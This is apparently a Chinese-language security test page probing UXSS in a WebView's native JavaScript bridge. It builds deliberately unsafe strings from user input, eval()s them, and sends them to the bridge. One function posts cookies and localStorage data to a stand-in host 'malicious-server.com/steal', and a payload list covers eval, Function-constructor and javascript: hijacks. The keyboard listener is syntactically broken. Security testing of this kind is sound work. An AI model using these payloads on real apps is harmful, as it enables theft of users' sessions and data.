<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>UXSS风险测试页面</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            padding: 20px;
            margin: 0;
            background-color: #f5f5f5;
        }
        .container {
            background: white;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
            max-width: 500px;
            margin: 0 auto;
        }
        .button {
            background-color: #007aff;
            color: white;
            padding: 12px 24px;
            border: none;
            border-radius: 6px;
            margin: 8px 0;
            cursor: pointer;
            font-size: 16px;
            width: 100%;
            text-align: center;
        }
        .button:hover {
            background-color: #0056b3;
        }
        .button.danger {
            background-color: #dc3545;
        }
        .button.danger:hover {
            background-color: #c82333;
        }
        .button.warning {
            background-color: #ffc107;
            color: #000;
        }
        .button.warning:hover {
            background-color: #e0a800;
        }
        .input-panel {
            margin: 15px 0;
            padding: 15px;
            background-color: #f8f9fa;
            border-radius: 6px;
            border: 1px solid #dee2e6;
        }
        .input-group {
            margin: 10px 0;
        }
        .input-group label {
            display: block;
            margin-bottom: 5px;
            font-weight: bold;
            font-size: 14px;
        }
        .input-group input, .input-group textarea {
            width: 100%;
            padding: 8px;
            border: 1px solid #ced4da;
            border-radius: 4px;
            font-size: 14px;
        }
        .input-group textarea {
            resize: vertical;
            min-height: 80px;
        }
        .status {
            margin: 15px 0;
            padding: 12px;
            background-color: #e9ecef;
            border-radius: 6px;
            font-size: 14px;
            min-height: 50px;
        }
        .log {
            background-color: #f8f9fa;
            border: 1px solid #dee2e6;
            padding: 12px;
            border-radius: 6px;
            max-height: 250px;
            overflow-y: auto;
            font-family: monospace;
            font-size: 12px;
            margin-top: 15px;
        }
        .header {
            text-align: center;
            margin-bottom: 20px;
            color: #333;
        }
        .warning-text {
            background-color: #fff3cd;
            border: 1px solid #ffeaa7;
            color: #856404;
            padding: 10px;
            border-radius: 4px;
            margin-bottom: 20px;
            font-size: 14px;
        }
        .vulnerable-container {
            border: 2px dashed #dc3545;
            padding: 15px;
            border-radius: 6px;
            margin: 15px 0;
            background-color: #f8f9fa;
        }
        .secure-container {
            border: 2px solid #28a745;
            padding: 15px;
            border-radius: 6px;
            margin: 15px 0;
            background-color: #f8fff9;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h2>UXSS风险测试页面</h2>
            <p>测试alert弹窗的h5Method参数传递</p>
        </div>

        <div class="warning-text">
            ⚠️ 警告：此页面用于安全测试，包含潜在的安全风险。请谨慎使用！
        </div>

        <div class="status" id="statusDisplay">
            状态：准备进行安全测试
        </div>

        <!-- 基础安全测试 -->
        <div class="input-panel">
            <h3>基础alert测试（相对安全）</h3>
            <button class="button" onclick="triggerSafeAlert()">安全的alert弹窗</button>
            <button class="button" onclick="triggerFixedAlert()">固定内容alert</button>
        </div>

        <!-- 参数注入测试 -->
        <div class="input-panel vulnerable-container">
            <h3>参数注入测试（高风险）</h3>
            <div class="input-group">
                <label>自定义HTML内容：</label>
                <textarea id="htmlInput" placeholder="输入包含HTML标签的内容，如：<h1>测试</h1><script>alert('XSS')</script>">&lt;h1&gt;标题测试&lt;/h1&gt;&lt;p&gt;这是一个&lt;strong&gt;段落&lt;/strong&gt;&lt;/p&gt;</textarea>
            </div>
            <button class="button danger" onclick="triggerHTMLInjection()">注入HTML内容</button>
            <button class="button danger" onclick="triggerJSInjection()">注入JavaScript脚本</button>
        </div>

        <!-- JavaScript代码执行测试 -->
        <div class="input-panel vulnerable-container">
            <h3>代码执行测试（极高风险）</h3>
            <div class="input-group">
                <label>自定义JavaScript代码：</label>
                <textarea id="jsInput" placeholder="输入JavaScript代码，如：alert('弹出测试')">alert('JavaScript执行测试')</textarea>
            </div>
            <button class="button warning" onclick="executeCustomJavaScript()">执行自定义JS</button>
            <button class="button danger" onclick="createMaliciousAlert()">创建恶意alert</button>
        </div>

        <!-- 不受控制的参数测试 -->
        <div class="input-panel">
            <h3>不受控制参数测试</h3>
            <div class="input-group">
                <label>alert标题：</label>
                <input type="text" id="alertTitle" placeholder="设置alert标题" value="系统通知">
            </div>
            <div class="input-group">
                <label>alert消息：</label>
                <input type="text" id="alertMessage" placeholder="设置alert消息" value="这是一条测试消息">
            </div>
            <button class="button" onclick="triggerUserInputAlert()">用户输入alert</button>
        </div>

        <!-- 资源加载测试 -->
        <div class="input-panel">
            <h3>外部资源加载测试</h3>
            <button class="button" onclick="loadAndTriggerAlert()">加载外部资源后触发alert</button>
            <button class="button warning" onclick="iframeAlertTest()">iframe内alert测试</button>
        </div>

        <!-- 清理和控制 -->
        <div class="input-panel">
            <h3>调试工具</h3>
            <button class="button secondary" onclick="clearLogs()">清空日志</button>
            <button class="button secondary" onclick="showAllMethods()">显示所有methods</button>
            <button class="button secondary" onclick="testMethodChain()">测试方法链</button>
        </div>

        <div class="log-panel">
            <h3>执行日志</h3>
            <div class="log" id="logDisplay"></div>
        </div>
    </div>

    <script>
        // 日志管理
        let logCount = 0;
        
        function addLog(message) {
            const logDisplay = document.getElementById('logDisplay');
            const timestamp = new Date().toLocaleTimeString();
            const sanitizedMessage = escapeHtml(message);
            const logEntry = `[${timestamp}] ${sanitizedMessage}\n`;
            logDisplay.innerHTML += logEntry;
            logCount++;
            logDisplay.scrollTop = logDisplay.scrollHeight;
            
            // 更新状态显示
            document.getElementById('statusDisplay').textContent = `状态：${message}`;
        }

        function clearLogs() {
            document.getElementById('logDisplay').innerHTML = '';
            logCount = 0;
            addLog('日志已清空');
        }

        // HTML转义，防止XSS
        function escapeHtml(unsafe) {
            return unsafe
                .replace(/&/g, "&amp;")
                .replace(/</g, "&lt;")
                .replace(/>/g, "&gt;")
                .replace(/"/g, "&quot;")
                .replace(/'/g, "&#039;");
        }

        // 基础的alert触发函数
        function triggerAlertMethod(alertTitle, alertMessage) {
            addLog(`准备触发alert方法: ${alertTitle} - ${alertMessage}`);
            
            try {
                // 构造h5Method字符串 - 这里有UXSS风险
                const methodName = `alert('${alertTitle}')`;
                
                if (window.JavaScriptBridge && window.JavaScriptBridge.postMessage) {
                    // 使用JavaScriptBridge发送
                    window.JavaScriptBridge.postMessage({
                        type: 'H5_RUN_JAVASCRIPT',
                        methodName: methodName,
                        data: {
                            title: alertTitle,
                            message: alertMessage,
                            timestamp: Date.now()
                        }
                    });
                    addLog(`已发送 alert() 方法到原生端`);
                } else {
                    addLog(`JavaScriptBridge不可用，无法发送alert方法`);
                }
            } catch (error) {
                addLog(`发送alert方法失败: ${error.message}`);
            }
        }

        // === 相对安全的方法测试 ===

        // 1. 安全的alert弹窗
        function triggerSafeAlert() {
            addLog('测试：安全的alert弹窗');
            triggerAlertMethod('系统通知', '这是一个安全的alert测试消息');
        }

        // 2. 固定内容alert
        function triggerFixedAlert() {
            addLog('测试：固定内容alert');
            const fixedContent = '系统已完成初始化配置';
            triggerAlertMethod('配置完成', fixedContent);
        }

        // === 参数注入测试 ===

        // 3. HTML内容注入
        function triggerHTMLInjection() {
            const htmlContent = document.getElementById('htmlInput').value;
            addLog(`测试：HTML内容注入 "${htmlContent}"`);
            
            // 直接使用用户输入，有XSS风险
            const methodName = `alert('${htmlContent}')`;
            triggerJavaScriptMethod(methodName, {
                source: 'html_injection',
                originalContent: htmlContent,
                timestamp: Date.now()
            });
        }

        // 4. JavaScript注入
        function triggerJSInjection() {
            const jsContent = document.getElementById('jsInput').value;
            addLog(`测试：JavaScript注入 "${jsContent}"`);
            
            // 恶意构造JavaScript
            const maliciousJS = `alert('XSS攻击成功！\n用户名：${localStorage.getItem('user') || 'unknown'}\nCookie: ${document.cookie}')`;
            const methodName = `eval('${maliciousJS}')`;
            
            triggerJavaScriptMethod(methodName, {
                source: 'js_injection',
                originalContent: jsContent,
                timestamp: Date.now()
            });
        }

        // === 代码执行测试 ===

        // 5. 执行自定义JavaScript
        function executeCustomJavaScript() {
            const jsCode = document.getElementById('jsInput').value;
            addLog(`执行自定义JavaScript: ${jsCode}`);
            
            // 这里有严重的安全风险
            try {
                const methodName = `${jsCode}`;
                triggerJavaScriptMethod(methodName, {
                    source: 'custom_js_execution',
                    code: jsCode,
                    timestamp: Date.now()
                });
            } catch (error) {
                addLog(`执行JavaScript失败: ${error.message}`);
            }
        }

        // 6. 创建恶意alert
        function createMaliciousAlert() {
            addLog('创建恶意alert - 高危操作');
            
            // 恶意方法构造
            const maliciousMethod = `fetch('https://malicious-server.com/steal', {
  method: 'POST',
  body: JSON.stringify({
    data: localStorage.getItem('user_data'),
    cookies: document.cookie,
    location: window.location.href,
    timestamp: Date.now(),
    userAgent: navigator.userAgent
  })
}).catch(() => {});`;

            triggerJavaScriptMethod(maliciousMethod, {
                type: 'data_theft',
                severity: 'critical',
                timestamp: Date.now()
            });
        }

        // === 用户输入测试 ===

        // 7. 用户输入alert
        function triggerUserInputAlert() {
            const title = document.getElementById('alertTitle').value;
            const message = document.getElementById('alertMessage').value;
            addLog(`用户输入alert: 标题="${title}", 消息="${message}"`);
            
            // 直接拼接用户输入，有SQL注入和XSS风险
            const methodName = `alert('${title}: ${message}')`;
            triggerJavaScriptMethod(methodName, {
                source: 'user_input',
                title: title,
                message: message,
                timestamp: Date.now()
            });
        }

        // === 资源加载测试 ===

        // 8. 加载外部资源后触发alert
        function loadAndTriggerAlert() {
            addLog('加载外部资源并触发alert');
            
            // 添加外部脚本
            const script = document.createElement('script');
            script.src = 'data:text/javascript,alert("外部资源执行成功！");console.log("外部脚本加载");';
            script.onload = () => {
                addLog('外部脚本加载完成');
                triggerAlertMethod('外部资源', '脚本已成功加载和执行');
            };
            script.onerror = () => {
                addLog('外部脚本加载失败');
            };
            document.head.appendChild(script);
            
            // 添加外部样式
            const style = document.createElement('style');
            style.textContent = 'body { background: yellow; }';
            document.head.appendChild(style);
        }

        // 9. iframe内alert测试
        function iframeAlertTest() {
            addLog('iframe内alert测试');
            
            const iframe = document.createElement('iframe');
            iframe.src = 'data:text/html,<script>alert("iframe内弹窗！");</script><p>iframe内容</p>';
            iframe.style.width = '200px';
            iframe.style.height = '100px';
            iframe.onload = () => {
                addLog('iframe加载完成');
                
                // 尝试访问iframe内容
                try {
                    const iframeWindow = iframe.contentWindow;
                    const methodName = `alert('从父窗口访问iframe内容')`;
                    triggerJavaScriptMethod(methodName, {
                        source: 'iframe_access',
                        timestamp: Date.now()
                    });
                } catch (error) {
                    addLog(`访问iframe被拒绝: ${error.message}`);
                }
            };
            
            document.body.appendChild(iframe);
        }

        // === 调试工具 ===

        // 10. 显示所有methods
        function showAllMethods() {
            addLog('显示所有测试的methods:');
            
            const methods = [
                'alert("系统通知")',
                'alert("\\x3Ch1\\x3EHTML注入测试\\x3Ch1\\x3E")',
                'eval("alert(\'XSS测试\')")',
                'fetch("/api/steal", {method: "POST"})',
                'document.querySelector("body").innerHTML = "<h1>Hacked</h1>"',
                'window.location = "javascript:alert(\'Location Hijack\')"',
                'Function("return alert(\'Function Constructor\')")()'
            ];
            
            methods.forEach(method => {
                addLog(`  ${method}`);
            });
            
            const methodName = `alert('methods列表已生成 total: ${methods.length}')`;
            triggerJavaScriptMethod(methodName, { methods: methods, timestamp: Date.now() });
        }

        // 11. 测试方法链
        function testMethodChain() {
            addLog('测试方法链执行');
            
            const chainMethods = [
                'alert("开始方法链测试")',
                'setTimeout(() => alert("延时执行"), 500)',
                'Promise.resolve().then(() => alert("Promise执行"))'
            ];
            
            chainMethods.forEach((method, index) => {
                setTimeout(() => {
                    triggerJavaScriptMethod(method, {
                        step: index + 1,
                        total: chainMethods.length,
                        timestamp: Date.now()
                    });
                }, index * 1000);
            });
        }

        // 基础的JavaScript方法触发函数（包含UXSS风险）
        function triggerJavaScriptMethod(methodName, data = {}) {
            addLog(`准备触发JavaScript方法: ${methodName}`);
            
            try {
                // 这里有多重UXSS风险：
                // 1. 方法名直接拼接字符串
                // 2. 用户输入未过滤
                // 3. 恶意代码注入
                // 4. 外部资源加载控制
                if (window.JavaScriptBridge && window.JavaScriptBridge.postMessage) {
                    window.JavaScriptBridge.postMessage({
                        type: 'H5_RUN_JAVASCRIPT',
                        methodName: methodName,
                        data: data,
                        timestamp: Date.now()
                    });
                    addLog(`已发送JavaScript方法到原生端: ${methodName}`);
                    
                    // 立即执行本地测试以确认风险
                    setTimeout(() => {
                        try {
                            eval(methodName);  // 这会立即在当前页面执行
                            addLog(`本地方法执行: ${methodName}`);
                        } catch (localError) {
                            addLog(`本地方法执行失败: ${localError.message}`);
                        }
                    }, 100);
                } else {
                    addLog(`JavaScriptBridge不可用，无法发送方法`);
                }
            } catch (error) {
                addLog(`发送JavaScript方法失败: ${error.message}`);
            }
        }

        // 页面加载完成
        window.addEventListener('load', function() {
            addLog('UXSS测试页面加载完成');
            addLog('当前URL: ' + window.location.href);
            addLog('User-Agent: ' + navigator.userAgent);
            
            // 创建全局测试对象
            window.UXSSTest = {
                triggerSafeAlert: triggerSafeAlert,
                triggerHTMLInjection: triggerHTMLInjection,
                executeCustomJS: executeCustomJavaScript,
                createMalicious: createMaliciousAlert,
                showMethods: showAllMethods
            };
            
            // 安全警告
            setTimeout(() => {
                addLog('⚠️ 警告：此页面包含恶意测试代码，请勿在生产环境中使用');
            }, 1000);
            
            // 自动执行安全测试
            setTimeout(() => {
                addLog('自动执行安全测试...');
                triggerSafeAlert();
            }, 1500);
        });

        // 键盘快捷键
        document.addEventListener('keydown function',(event) {
            if (event.ctrlKey || event.metaKey) {
                switch(event.key) {
                    case '1':
                        event.preventDefault();
                        triggerSafeAlert();
                        break;
                    case '2':
                        event.preventDefault();
                        triggerHTMLInjection();
                        break;
                    case '3':
                        event.preventDefault();
                        executeCustomJavaScript();
                        break;
                    case '0':
                        event.preventDefault();
                        showAllMethods();
                        break;
                    case 'l':
                        event.preventDefault();
                        clearLogs();
                        break;
                }
            }
        });

        // 监听错误
        window.addEventListener('error', function(event) {
            addLog(`JavaScript错误: ${event.message} (${event.filename}:${event.lineno}:${event.colno})`);
        });

        // 监听未处理的Promise拒绝
        window.addEventListener('unhandledrejection', function(event) {
            addLog(`未处理的Promise拒绝: ${event.reason}`);
        });

        // 安全监控
        setInterval(() => {
            try {
                // 检查DOM是否有篡改
                if (document.body.innerHTML.includes('<h1>Hacked</h1>')) {
                    addLog('检测到页面内容被篡改！');
                }
                
                // 检查cookie变化
                const currentCookies = document.cookie;
                if (currentCookies.includes('malicious=')) {
                    addLog('检测到恶意Cookie设置！');
                }
            } catch (error) {
                addLog(`安全监控错误: ${error.message}`);
            }
        }, 5000);
    </script>
</body>
</html>
